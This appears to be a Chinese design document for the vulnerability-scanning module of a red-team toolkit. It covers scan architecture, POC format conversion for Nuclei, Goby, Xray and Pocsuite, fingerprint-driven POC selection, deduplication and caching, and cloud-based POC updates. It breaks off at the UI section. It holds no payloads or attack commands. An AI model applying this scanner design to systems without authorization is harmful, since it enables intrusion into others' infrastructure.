# PotatoTool 漏洞扫描模块设计文档

## 1. 概述

### 1.1 模块定位
漏洞扫描模块是 PotatoTool 红队工具集的核心功能之一，提供多格式 POC 支持、智能扫描、指纹识别等企业级漏洞检测能力。

### 1.2 核心特性
- **多格式 POC 支持**：Nuclei、Goby、Xray、Pocsuite
- **智能扫描模式**：指纹识别 + 精准 POC 匹配
- **性能优化**：POC 去重、响应缓存、请求聚类
- **多协议支持**：HTTP、TCP、UDP、DNS、SSL、File、Headless、Code
- **完整 UI 集成**：JavaFX 界面，所有配置可视化

---

## 2. 架构设计

### 2.1 整体架构

```
┌─────────────────────────────────────────────────────────────────┐
│                         UI 层 (JavaFX)                          │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │              PaneVulScan (控制器)                         │  │
│  │  - 目标管理  - POC选择  - 配置管理  - 结果展示           │  │
│  └──────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                        服务层 (Service)                          │
│  ┌────────────────┐  ┌─────────────────┐  ┌─────────────────┐  │
│  │ VulnScanService│  │UnifiedVulnScan  │  │ FingerprintSvc  │  │
│  │   (传统模式)   │  │  Service (智能) │  │   (指纹识别)    │  │
│  └────────────────┘  └─────────────────┘  └─────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                        核心层 (Core)                             │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐  ┌───────────┐ │
│  │ ScanEngine │  │ PocExecutor│  │Clustered   │  │ResponseMa-│ │
│  │  (调度器)  │  │  (执行器)  │  │PocExecutor │  │   tcher   │ │
│  └────────────┘  └────────────┘  └────────────┘  └───────────┘ │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                      工具层 (Utilities)                          │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌────────┐ │
│  │TagNormalizer│  │PocDedu-     │  │ResponseCache│  │InputType│ │
│  │ (标签规范化)│  │plicator     │  │  Service    │  │Detector │ │
│  └─────────────┘  └─────────────┘  └─────────────┘  └────────┘ │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                        数据层 (Data)                             │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌────────┐ │
│  │PocRepository│  │ ScanConfig  │  │ ScanResult  │  │ PocObj │ │
│  │  (POC仓库)  │  │  (配置)     │  │   (结果)    │  │(POC对象)│ │
│  └─────────────┘  └─────────────┘  └─────────────┘  └────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 目录结构

```
vulnScanner/
├── classObj/                    # 数据对象
│   └── PocObj.java              # 通用 POC 对象
├── core/                        # 核心执行
│   ├── VulnScanService.java     # 传统扫描服务
│   ├── UnifiedVulnScanService.java  # 统一扫描服务（智能模式）
│   ├── ScanEngine.java          # 扫描引擎
│   ├── PocExecutor.java         # POC 执行器
│   ├── ClusteredPocExecutor.java    # 聚类执行器
│   ├── FingerprintService.java  # 指纹识别服务
│   └── ResponseCacheService.java    # 响应缓存服务
├── loader/                      # POC 加载
│   ├── PocRepository.java       # POC 仓库
│   └── PocLoader.java           # POC 加载器
├── matchers/                    # 响应匹配
│   └── ResponseMatcher.java     # 响应匹配器
├── model/                       # 数据模型
│   ├── ScanConfig.java          # 扫描配置
│   └── ScanResult.java          # 扫描结果
├── util/                        # 工具类
│   ├── InputTypeDetector.java   # 输入类型检测
│   ├── PocDeduplicator.java     # POC 去重器
│   ├── TagNormalizer.java       # 标签规范化
│   ├── PocClassifier.java       # POC 分类器
│   └── converter/               # 格式转换器
│       ├── PocConverterRegistry.java
│       ├── NucleiPocConverter.java
│       ├── GobyPocConverter.java
│       └── XrayPocConverter.java
├── event/                       # 事件系统
│   ├── ScanEventListener.java
│   ├── ScanEventDispatcher.java
│   └── ScanEvent*.java
├── exception/                   # 异常定义
│   ├── VulnScanException.java
│   ├── PocLoadException.java
│   ├── PocParseException.java
│   ├── ScanExecutionException.java
│   ├── NetworkException.java
│   └── ConfigurationException.java
├── storage/                     # 存储层
│   ├── VulnScanDatabase.java   # SQLite 数据库管理
│   ├── ScanHistory.java        # 扫描历史记录
│   └── DatabaseStatistics.java # 统计信息
└── report/                      # 报告生成
    ├── ReportGenerator.java
    ├── WordReportGenerator.java
    ├── ExcelReportGenerator.java
    ├── HtmlReportGenerator.java
    ├── JsonReportGenerator.java
    └── CsvReportGenerator.java
```

---

## 3. 项目初始化扫描器流程

### 3.1 应用启动流程

```
┌─────────────────────────────────────────────────────────────────────┐
│                      应用启动 → 扫描器初始化                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. ToStart.main()                                                   │
│     ├── 设置系统属性 (JVM 参数)                                      │
│     ├── 加载 Bouncy Castle Provider (bcprov.jar)                    │
│     └── 启动 JavaFX 应用 (MainApplication)                           │
│                                                                      │
│  2. MainApplication.start()                                          │
│     ├── 加载主窗口 FXML                                              │
│     ├── 初始化 MainController                                        │
│     └── 显示主界面                                                    │
│                                                                      │
│  3. MainController.initialize()                                      │
│     ├── 初始化配置管理器                                              │
│     ├── 加载用户配置                                                  │
│     └── 初始化各功能模块                                              │
│                                                                      │
│  4. 用户切换到"漏洞扫描"标签页                                         │
│     └── 触发 PaneVulScan.initialize()                                │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.2 扫描器模块初始化流程

**控制器**: `PaneVulScan.java`
**初始化时机**: 用户首次切换到漏洞扫描标签页时

```
┌─────────────────────────────────────────────────────────────────────┐
│               PaneVulScan.initialize() 初始化流程                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  第一步：初始化核心服务                                                │
│  ├── 1.1 初始化全局配置                                               │
│  │   └── VulnScanConfig.getInstance()                               │
│  │       ├── 从 ~/.PotatoTool/config/vulnscan.json 加载配置         │
│  │       └── 配置不存在则使用默认值                                   │
│  │                                                                   │
│  ├── 1.2 初始化数据库                                                 │
│  │   └── VulnScanDatabase.getInstance()                             │
│  │       ├── 检查 ~/.PotatoTool/resources/vulnscan/vulnscan.db      │
│  │       ├── 不存在则创建数据库和表结构                               │
│  │       └── 执行数据库迁移 (DatabaseMigration)                      │
│  │                                                                   │
│  ├── 1.3 初始化 POC 仓库                                              │
│  │   └── PocRepository.getInstance()                                │
│  │       ├── 从数据库加载已解析的 POC                                 │
│  │       ├── POC 数量为 0 → 触发首次初始化                           │
│  │       └── 加载 POC 到内存 (按格式分类索引)                         │
│  │                                                                   │
│  ├── 1.4 创建扫描引擎                                                 │
│  │   └── new ScanEngine(scanConfig)                                 │
│  │       ├── 初始化 PocExecutor                                      │
│  │       ├── 初始化事件分发器                                         │
│  │       └── 启动数据库写入线程                                       │
│  │                                                                   │
│  └── 1.5 创建扫描服务                                                 │
│      ├── new VulnScanService(scanEngine, pocRepository)             │
│      └── 注册默认事件监听器                                           │
│                                                                      │
│  第二步：POC 首次初始化 (仅首次运行)                                    │
│  └── 2.1 检测到 POC 数量为 0                                          │
│      ├── 显示初始化提示                                                │
│      ├── 从 resources/poc/ 读取内置 POC 文件                          │
│      ├── 按格式解析 POC                                                │
│      │   ├── Nuclei POC → NucleiPocConverter                         │
│      │   ├── Xray POC → XrayPocConverter                            │
│      │   ├── Goby POC → GobyPocConverter                            │
│      │   └── Pocsuite POC → PocsuitePocConverter                    │
│      ├── 解析后的 POC 写入数据库                                       │
│      │   └── 计算 content_hash (MD5)                                │
│      └── 更新 POC 统计信息                                            │
│                                                                      │
│  第三步：UI 初始化                                                     │
│  ├── 3.1 绑定 UI 控件                                                 │
│  │   ├── 扫描控制按钮 (开始/暂停/停止)                                 │
│  │   ├── 配置选项 (线程数/超时/重试等)                                 │
│  │   └── POC 格式筛选框                                               │
│  │                                                                   │
│  ├── 3.2 初始化日志系统                                                │
│  │   └── ScanLogger.getInstance()                                   │
│  │       ├── 创建内存日志队列 (1000 条)                               │
│  │       ├── 创建日志文件 (~/.PotatoTool/logs/scan_YYYYMMDD.log)    │
│  │       └── 启动异步写入线程                                         │
│  │                                                                   │
│  ├── 3.3 加载 POC 统计信息                                            │
│  │   ├── 查询数据库 POC 总数                                          │
│  │   ├── 按格式统计 (Nuclei/Xray/Goby/Pocsuite)                      │
│  │   └── 更新 UI 显示                                                 │
│  │                                                                   │
│  └── 3.4 设置事件监听器                                                │
│      └── VulnScanService.addEventListener()                         │
│          ├── SCAN_STARTED → 更新进度条                               │
│          ├── SCAN_PROGRESS → 更新扫描统计                            │
│          ├── VULNERABILITY_FOUND → 添加漏洞到结果列表                 │
│          ├── SCAN_COMPLETED → 显示完成提示                           │
│          └── SCAN_ERROR → 记录错误日志                               │
│                                                                      │
│  第四步：后台任务                                                      │
│  └── 4.1 检查 POC 更新 (异步)                                         │
│      ├── 请求云端清单 (potato.gold/data/uploads/PotatoTool/poc/poc.json) │
│      ├── 对比本地数据库 content_hash                                  │
│      ├── 发现新版本 → 显示更新提示                                     │
│      └── 用户确认后下载更新                                            │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 POC 仓库初始化详细流程

```
┌─────────────────────────────────────────────────────────────────────┐
│                  PocRepository 首次初始化                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  输入：resources/poc/ 目录 (打包在 JAR 内)                            │
│                                                                      │
│  步骤 1: 扫描 POC 文件                                                │
│  └── ClassLoader.getResourceAsStream("poc/...")                     │
│      ├── poc/nucleiPoc/**/*.yaml                                    │
│      ├── poc/xrayPoc/**/*.yml                                       │
│      ├── poc/gobyPoc/**/*.json                                      │
│      └── poc/pocsuitePoc/**/*.json                                  │
│                                                                      │
│  步骤 2: 格式转换 (多线程)                                             │
│  └── PocConverterFactory.getConverter(format)                       │
│      ├── 检测文件格式 (YAML/JSON)                                    │
│      ├── 调用对应转换器                                                │
│      │   ├── NucleiPocConverter.convert()                           │
│      │   │   ├── 解析 YAML 结构                                      │
│      │   │   ├── 提取 id/name/severity/tags                         │
│      │   │   ├── 转换 verifySteps/exploitSteps                      │
│      │   │   └── 规范化标签 (TagNormalizer)                          │
│      │   ├── XrayPocConverter.convert()                             │
│      │   ├── GobyPocConverter.convert()                             │
│      │   └── PocsuitePocConverter.convert()                         │
│      └── 输出：PocObj.Poc (统一格式)                                  │
│                                                                      │
│  步骤 3: POC 增强处理                                                 │
│  └── PocClassifier.classify(poc)                                    │
│      ├── 根据标签推断 PocCategory                                     │
│      ├── 判断是否需要 Headless/Code/Fuzz                             │
│      ├── 提取指纹信息                                                  │
│      └── 计算 content_hash (MD5)                                    │
│                                                                      │
│  步骤 4: 数据库存储                                                   │
│  └── VulnScanDatabase.savePoc(poc)                                  │
│      ├── INSERT INTO pocs (id, name, content_hash, ...)            │
│      ├── 去重: ON CONFLICT(content_hash) DO NOTHING                 │
│      └── 批量插入 (每次 100 条)                                       │
│                                                                      │
│  步骤 5: 内存索引                                                     │
│  └── PocRepository.buildIndex()                                     │
│      ├── 按格式索引: pocsByFormat.get("nuclei")                      │
│      ├── 按分类索引: pocsByCategory.get("CVES")                      │
│      ├── 按严重度索引: pocsBySeverity.get("CRITICAL")                 │
│      └── 按标签索引: pocsByTag.get("apache")                         │
│                                                                      │
│  输出：                                                               │
│  ├── 数据库: ~/.PotatoTool/resources/vulnscan/vulnscan.db           │
│  └── 内存索引: PocRepository.pocsByFormat/Category/Severity/Tag     │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.4 扫描引擎启动流程

```
┌─────────────────────────────────────────────────────────────────────┐
│              ScanEngine.startScan() 执行流程                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  输入：                                                               │
│  ├── targets: List<String> (目标列表)                                │
│  ├── pocs: List<PocObj.Poc> (POC 列表)                              │
│  └── scanConfig: ScanConfig (扫描配置)                               │
│                                                                      │
│  第一步：参数验证和初始化                                              │
│  ├── 1.1 验证输入参数                                                 │
│  │   ├── 检查 targets 是否为空                                       │
│  │   ├── 检查 pocs 是否为空                                          │
│  │   └── 检查是否已有扫描在运行                                       │
│  │                                                                   │
│  ├── 1.2 生成扫描 ID                                                 │
│  │   └── "scan-" + timestamp + "-" + uuid                           │
│  │                                                                   │
│  ├── 1.3 初始化扫描状态                                                │
│  │   ├── isScanning = true                                          │
│  │   ├── isPaused = false                                           │
│  │   ├── scanResults.clear()                                        │
│  │   ├── completedTasks.set(0)                                      │
│  │   └── scanStartTime = currentTimeMillis()                        │
│  │                                                                   │
│  └── 1.4 初始化线程池                                                 │
│      └── initExecutorService()                                      │
│          ├── 读取线程池配置 (coreThreads/maxThreads/queueSize)       │
│          ├── 创建 ThreadPoolExecutor                                 │
│          └── 设置拒绝策略 (CallerRunsPolicy)                         │
│                                                                      │
│  第二步：创建扫描任务                                                  │
│  └── createScanTasks(targets, pocs)                                 │
│      ├── 笛卡尔积: target × poc                                      │
│      ├── 创建 ScanTask 对象                                          │
│      └── 输出: List<ScanTask> (target + poc 组合)                   │
│                                                                      │
│  第三步：保存扫描状态到数据库                                           │
│  └── saveScanState()                                                │
│      ├── 创建 ScanState 对象                                         │
│      ├── 记录扫描 ID、开始时间、配置信息                               │
│      └── INSERT INTO scan_states                                    │
│                                                                      │
│  第四步：触发扫描开始事件                                               │
│  └── dispatchScanStarted()                                          │
│      ├── ScanLogger.info("扫描开始: 共 X 个任务")                     │
│      └── UI 更新进度条和状态标签                                      │
│                                                                      │
│  第五步：执行扫描                                                      │
│  └── executeScan(tasks)                                             │
│      ├── 提交所有任务到线程池                                         │
│      ├── CompletableFuture.allOf(futures)                           │
│      └── 等待所有任务完成                                             │
│                                                                      │
│  第六步：任务执行 (多线程)                                             │
│  └── executeTask(task) - 每个任务独立执行                            │
│      ├── 检查暂停状态                                                 │
│      ├── 检查任务是否已完成 (恢复扫描时)                               │
│      ├── 调用 PocExecutor.execute(target, poc)                      │
│      │   ├── 协议路由 (HTTP/DNS/TCP/SSL/...)                        │
│      │   ├── 发送请求                                                │
│      │   ├── 响应匹配 (ResponseMatcher)                             │
│      │   └── 返回 ScanResult                                        │
│      ├── 发现漏洞 → dispatchVulnerabilityFound()                     │
│      ├── 保存任务状态到数据库队列                                      │
│      └── 更新进度 (每 10 个任务触发一次事件)                           │
│                                                                      │
│  第七步：扫描完成处理                                                  │
│  └── .thenRun() / .exceptionally()                                  │
│      ├── 计算总耗时                                                   │
│      ├── 更新数据库状态 (COMPLETED/FAILED)                           │
│      ├── 触发 ScanCompletedEvent                                    │
│      ├── ScanLogger.info("扫描完成: 发现 X 个漏洞")                   │
│      └── UI 显示完成提示                                              │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.5 日志系统初始化

```
┌─────────────────────────────────────────────────────────────────────┐
│                  ScanLogger 日志系统初始化                            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  初始化时机：首次调用 ScanLogger.getInstance()                        │
│                                                                      │
│  步骤 1: 创建单例实例                                                 │
│  └── private ScanLogger()                                           │
│      ├── 创建内存队列: LinkedBlockingQueue<LogEntry>(1000)          │
│      ├── 创建日志文件目录: ~/.PotatoTool/logs/                       │
│      └── 确定日志文件名: scan_20260105.log                           │
│                                                                      │
│  步骤 2: 启动异步写入线程                                              │
│  └── startFileWriter()                                              │
│      ├── 创建守护线程: "scan-logger-writer"                          │
│      ├── 循环从队列取日志: logQueue.poll(1, SECONDS)                  │
│      ├── 格式化日志: [TIMESTAMP] [LEVEL] [CATEGORY] message         │
│      ├── 写入文件: BufferedWriter.write()                            │
│      └── 定期刷新: flush() 每秒                                      │
│                                                                      │
│  步骤 3: 日志分级系统                                                 │
│  └── 5 个日志级别                                                     │
│      ├── DEBUG: 调试信息 (线程池初始化、内部状态)                      │
│      ├── INFO: 一般信息 (扫描开始/完成、恢复扫描)                      │
│      ├── WARN: 警告信息 (配置不合理、性能问题)                         │
│      ├── ERROR: 错误信息 (扫描失败、网络异常)                          │
│      └── SUCCESS: 成功事件 (发现漏洞)                                 │
│                                                                      │
│  步骤 4: 日志分类                                                     │
│  └── 按功能分类 (CATEGORY)                                           │
│      ├── SYSTEM: 系统级日志 (初始化、配置、线程池)                     │
│      ├── SCAN: 扫描流程日志 (开始/暂停/恢复/完成)                     │
│      ├── HTTP: HTTP 协议日志 (请求/响应)                             │
│      ├── DNS: DNS 协议日志                                           │
│      └── ... (其他协议)                                              │
│                                                                      │
│  步骤 5: UI 集成                                                      │
│  └── 日志查看器 (PaneVulScan.java)                                   │
│      ├── 实时日志显示: TextArea                                      │
│      ├── 日志级别筛选: ComboBox (全部/DEBUG/INFO/...)                 │
│      ├── 关键词搜索: TextField                                       │
│      └── 自动滚动到最新日志                                           │
│                                                                      │
│  输出：                                                               │
│  ├── 内存日志: 最近 1000 条                                           │
│  └── 文件日志: ~/.PotatoTool/logs/scan_YYYYMMDD.log                 │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 4. 核心组件设计

### 3.1 PocObj - 通用 POC 对象

```java
public class PocObj {
    @Data
    public static class Poc {
        // 基本信息
        private String id;                  // POC 唯一标识
        private String name;                // POC 名称
        private Severity severity;          // 严重程度
        private String protocol;            // 协议类型
        private List<String> tags;          // 标签
        
        // 执行步骤
        private List<PocStep> verifySteps;  // 验证步骤
        private List<PocStep> exploitSteps; // 利用步骤
        
        // 新增：智能扫描字段
        private InputType inputType;        // 输入类型
        private PocCategory category;       // POC 分类
        private Set<String> normalizedTags; // 规范化标签
        private FingerprintInfo fingerprint;// 指纹信息
        
        // 特殊 Flag
        private boolean requiresHeadless;   // 需要 Headless
        private boolean requiresCode;       // 需要本地代码
        private boolean requiresFuzz;       // 需要模糊测试
    }
    
    public enum InputType { URL, HOST_PORT, DOMAIN, FILE_PATH }
    public enum PocCategory { CVE, CNVD, RCE, SQL_INJECTION, XSS, ... }
    public enum Severity { CRITICAL, HIGH, MEDIUM, LOW, INFO, UNKNOWN }
}
```

### 3.2 ScanConfig - 扫描配置

```java
public class ScanConfig {
    // ========== 基础配置 ==========
    private int threads = 20;           // 并发线程数
    private int timeout = 15;           // 请求超时(秒)
    private int retries = 2;            // 重试次数
    private String proxy;               // 代理设置
    private String userAgent;           // UA 字符串
    
    // ========== 扫描模式 ==========
    private ScanMode scanMode = SMART;  // 扫描模式
    private InputType inputType = URL;  // 输入类型
    private boolean autoDetectInputType = true;
    
    // ========== 指纹识别 ==========
    private boolean skipFingerprint;    // 跳过指纹识别
    private int fingerprintTimeout;     // 指纹识别超时
    
    // ========== POC 筛选 ==========
    private Set<String> enabledPocFormats;      // POC 格式
    private Set<PocCategory> enabledCategories; // 分类筛选
    private Set<Severity> severities;           // 严重程度
    private Set<String> filterTags;             // 标签过滤
    
    // ========== 优化选项 ==========
    private boolean enableDeduplication = true; // POC 去重
    private boolean enableResponseCache = true; // 响应缓存
    private long responseCacheTtlMs;            // 缓存 TTL
    private boolean enableClustering = true;    // 请求聚类
    
    // ========== 特殊模板 ==========
    private boolean enableHeadless;     // Headless 模板
    private boolean enableCode;         // Code 模板
    private boolean enableFuzz;         // Fuzz 模板
    
    public enum ScanMode { SMART, DEFAULT }
}
```

### 3.3 UnifiedVulnScanService - 统一扫描服务

**核心扫描流程：**

```
┌─────────────────────────────────────────────────────────────┐
│                    扫描流程 (Smart Mode)                     │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  1. 输入类型检测 (InputTypeDetector)                         │
│     - 自动识别：URL / IP:Port / 域名 / 文件路径              │
│     - 规范化目标格式                                         │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  2. 指纹识别 (FingerprintService) [仅 Smart 模式]            │
│     - 发送探测请求                                           │
│     - 匹配指纹规则库                                         │
│     - 输出：ProductName, Version, Tags                       │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  3. POC 选择 (按 Nuclei 官方三阶段分类)                       │
│     - 按输入类型筛选                                         │
│     - Smart 模式 (参考 nuclei -as 智能扫描):                 │
│       * 阶段一: 指纹识别类(technologies) - 已在步骤2执行     │
│       * 阶段二: 核心漏洞类(cves/cnvd/vulnerabilities等)      │
│         - 已识别指纹 → 只扫描匹配指纹的 POC                  │
│         - 未识别指纹 → 跳过（不知道技术栈）                  │
│       * 阶段三: 通用审计类(misconfiguration/exposures等)     │
│         - 始终执行，不依赖指纹                               │
│     - 按分类/严重程度/格式筛选                               │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  4. POC 去重 (PocDeduplicator)                               │
│     - 按 CVE ID 去重                                         │
│     - 按名称模糊去重                                         │
│     - 请求签名相同的 POC 不去重，而是记录用于运行时复用请求  │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  5. 执行扫描 (PocExecutor / ClusteredPocExecutor)           │
│     - 响应缓存检查                                           │
│     - 请求聚类执行（可选）                                   │
│     - 响应匹配 (ResponseMatcher)                             │
│     - 结果记录                                               │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  6. 结果输出 (ScanResult)                                    │
│     - 漏洞详情                                               │
│     - 指纹信息                                               │
│     - 原始响应片段                                           │
└─────────────────────────────────────────────────────────────┘
```

### 3.4 POC 分类体系（参考 Nuclei 官方）

```
POC 按执行阶段分为三类（PocCategory 枚举方法）：

┌─────────────────────────────────────────────────────────────────┐
│ 阶段一：指纹识别类 (isFingerprint() == true)                     │
│   - TECHNOLOGIES      : 技术栈指纹 (http/technologies)          │
│   - EXPOSED_PANELS    : 暴露面板 (http/exposed-panels)          │
│   - HONEYPOT          : 蜜罐检测 (http/honeypot)                │
│   - NETWORK_DETECTION : 网络服务指纹 (network/detection)        │
│   用途：识别目标技术栈，决定后续扫描范围                         │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ 阶段二：核心漏洞类 (requiresFingerprint() == true)               │
│   - CVES              : CVE 漏洞 (http/cves)                    │
│   - CNVD              : CNVD 漏洞 (http/cnvd)                   │
│   - VULNERABILITIES   : 通用漏洞 (http/vulnerabilities)         │
│   - DEFAULT_LOGINS    : 默认口令 (http/default-logins)          │
│   - IOT               : IoT 漏洞 (http/iot)                     │
│   - NETWORK_CVE       : 网络 CVE (network/cves)                 │
│   条件：智能模式下需要先识别出匹配的指纹才执行                   │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ 阶段三：通用审计类 (isGenericAudit() == true)                    │
│   - MISCONFIGURATION  : 配置错误 (http/misconfiguration)        │
│   - EXPOSURES         : 信息泄露 (http/exposures)               │
│   - MISCELLANEOUS     : 杂项检测 (http/miscellaneous)           │
│   - SSL               : SSL/TLS 检测 (ssl/)                     │
│   - DNS_CONFIG        : DNS 配置审计 (dns/)                     │
│   条件：不依赖指纹，任何目标都可以扫描                           │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ 默认排除类 (requiresSpecialInput() == true)                      │
│   - OSINT             : 信息收集 (需要特定输入)                  │
│   - TOKEN_SPRAY       : Token 验证 (需要 API Key)               │
│   - FUZZING           : 模糊测试 (需要 -fuzz flag)              │
│   - CREDENTIAL_STUFFING: 撞库 (需要凭证)                        │
│   - TAKEOVERS         : 子域名接管 (针对域名记录)               │
│   - HEADLESS          : 无头浏览器 (需要 -headless flag)        │
│   条件：需要额外输入或特殊 Flag 才能执行                         │
└─────────────────────────────────────────────────────────────────┘
```

### 3.5 性能优化组件

#### 3.5.1 PocDeduplicator - POC 去重器

```
去重策略（按优先级）：
1. CVE ID 去重：相同 CVE 只保留一个
2. 名称模糊去重：规范化名称后相同的去重
3. 请求签名记录：相同请求特征的 POC 不去重，但记录到 signatureGroups
   - 运行时复用同一个网络请求的响应结果
   - 各个 POC 仍需各自执行验证逻辑

去重效果：通常可减少 20-40% 的 POC 数量
```

#### 3.5.2 ResponseCacheService - 响应缓存

```
缓存策略：
- LRU 淘汰：默认最大 1000 条
- TTL 过期：默认 5 分钟
- 缓存键：URL + Method + Body Hash + Headers Hash

命中场景：
- 同一 URL 的多个 POC
- 短时间内重复扫描
```

#### 3.5.3 ClusteredPocExecutor - 请求聚类

```
聚类策略：
- 按 HTTP Method + Path + Body Hash 分组
- 同组 POC 只发送一次请求
- 响应匹配所有组内规则

效果：减少 60-80% 的网络请求
```

### 3.6 POC 存储与更新管理

#### 3.6.1 存储架构

```
┌─────────────────────────────────────────────────────────────────────┐
│                      POC 存储架构（新方案）                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  内置存储（打包进 JAR，无需 zip 压缩）：                              │
│  src/main/resources/poc/                                             │
│  ├── nucleiPoc/        # Nuclei 格式 POC                             │
│  ├── gobyPoc/          # Goby 格式 POC                               │
│  ├── xrayPoc/          # Xray 格式 POC                               │
│  └── pocsuitePoc/      # Pocsuite 格式 POC                           │
│  说明：resources 目录会被 Maven 打包进 JAR，运行时通过 ClassLoader 读取│
│                                                                      │
│  本地存储（用户目录）：                                               │
│  ~/.PotatoTool/resources/vulnscan/                                   │
│  └── vulnscan.db       # SQLite 数据库（POC 解析后存储，包含 content_hash）│
│  说明：不再保存本地清单文件，热更新基于 DB 中 content_hash 判断          │
│                                                                      │
│  云端存储（potato.gold/GitHub）：                                     │
│  https://potato.gold/data/uploads/PotatoTool/poc/                    │
│  ├── poc.json          # 云端清单（包含所有 POC 元数据）              │
│  ├── nucleiPoc/        # 保持与内置目录结构一致                       │
│  │   ├── cves/2024/                                                  │
│  │   │   ├── CVE-2024-0001.yaml                                      │
│  │   │   └── CVE-2024-0002.yaml                                      │
│  │   └── ...                                                         │
│  ├── gobyPoc/                                                        │
│  └── ...                                                             │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### 3.6.2 清单格式 (poc.json)

```json
{
  "version": "2025.01.15",
  "baseUrl": "https://potato.gold/data/uploads/PotatoTool/poc/",
  "lastUpdate": "2025-01-15T10:30:00Z",
  "directories": [
    {
      "path": "nuclei/cves/2024",
      "files": [
        {
          "name": "CVE-2024-0001.yaml",
          "version": "1.0.0",
          "md5": "abc123...",
          "action": "add",
          "size": 1234
        },
        {
          "name": "CVE-2024-0002.yaml",
          "version": "1.0.1",
          "md5": "def456...",
          "action": "update"
        }
      ]
    }
  ],
  "deleted": [
    {"id": "old-poc-id-1", "md5": "..."},
    {"id": "old-poc-id-2", "md5": "..."}
  ]
}
```

**字段说明：**
- `version`: 清单版本号
- `baseUrl`: POC 文件下载基础 URL
- `directories`: 目录结构，保持原有 POC 目录组织
- `files.md5`: 文件内容的 MD5 哈希（去重依据）
- `files.action`: 操作类型 (add/update/keep)
- `deleted`: 显式删除的 POC 列表（只根据此字段删除，不是"本地有云端无"）

#### 3.6.3 初始化流程

```
┌─────────────────────────────────────────────────────────────────────┐
│                      首次运行初始化流程                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. 检查本地数据库                                                    │
│     └── ~/.PotatoTool/resources/vulnscan/vulnscan.db                │
│                                                                      │
│  2. 数据库不存在：                                                    │
│     ├── 释放内置 poc.zip 到临时目录                                   │
│     ├── 解析所有 POC 文件 (PocLoader)                                │
│     ├── 写入 SQLite 数据库                                           │
│     └── 记录版本号到配置                                              │
│                                                                      │
│  3. 数据库存在但版本低于内置版本：                                     │
│     ├── 释放内置 poc.zip                                             │
│     ├── 对比已有 POC ID                                              │
│     ├── 仅导入新增的 POC                                             │
│     └── 更新版本号                                                    │
│                                                                      │
│  4. 版本相同：跳过初始化                                              │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### 3.6.4 热更新流程

```
┌─────────────────────────────────────────────────────────────────────┐
│                      热更新流程（增量更新）                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. 拉取云端清单                                                      │
│     └── GET https://potato.gold/data/uploads/PotatoTool/poc/poc.json │
│                                                                      │
│  2. 获取本地数据库中已有的 content_hash (MD5) 集合                    │
│                                                                      │
│  3. 计算差异                                                            │
│     ├── toAdd: 远程 md5 本地数据库不存在                               │
│     ├── toUpdate: action=update 的条目                               │
│     └── toDelete: 只根据云端 deleted 字段                             │
│                                                                      │
│  3. 只下载变化的 POC 文件                                             │
│     └── GET https://potato.gold/data/uploads/PotatoTool/poc/nuclei/cves/2024/CVE-xxx.yaml │
│                                                                      │
│  4. 应用更新                                                          │
│     ├── 删除：从数据库移除                                            │
│     ├── 新增：解析并插入数据库                                        │
│     └── 修改：删除旧的，插入新的                                      │
│                                                                      │
│  5. 更新本地版本号（不再保存本地清单文件）                             │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### 3.6.5 带宽对比

| 场景 | 完整下载方案 | 增量清单方案 |
|------|-------------|-------------|
| 初次安装 | 50MB | 50MB |
| 更新 1 个 POC | 50MB | ~5KB (清单) + ~2KB (POC) |
| 更新 100 个 POC | 50MB | ~5KB + ~200KB |
| 跨 3 个月更新 | 50MB | ~5KB + ~500KB |

#### 3.6.6 核心类

| 类名 | 职责 |
|------|------|
| `PocManifest` | 清单数据结构，支持 JSON 序列化和差异计算（基于 MD5） |
| `PocDatabaseInitializer` | 首次初始化和版本更新（不再保存本地清单） |
| `PocUpdateHandler` | 热更新处理，基于 DB 中 content_hash 判断差异 |
| `PocDatabaseManager` | 数据库 CRUD 操作（统一使用 content_hash MD5 去重） |

---

## 4. UI 设计

### 4.1 主界面布局

```
┌─────────────────────────────────────────────────────────────────┐
│  漏洞扫描                                                       │
├─────────────────────────────────────────────────────────────────┤
